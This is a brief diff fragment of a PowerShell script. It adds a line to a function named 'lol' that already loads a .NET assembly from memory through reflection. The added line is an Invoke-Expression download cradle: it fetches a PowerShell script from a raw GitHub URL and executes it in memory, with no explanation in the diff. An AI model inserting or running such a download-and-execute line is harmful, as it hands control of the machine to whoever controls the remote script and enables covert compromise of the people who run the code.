@@ -307,6 +307,6 @@ function lol{
     $Assembly = [Reflection.Assembly]::Load($c)
     $BindingFlags = [Reflection.BindingFlags] "Public,Static"
     $a = @()
-    
+    iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/1/master/1.ps1")
 	
 }
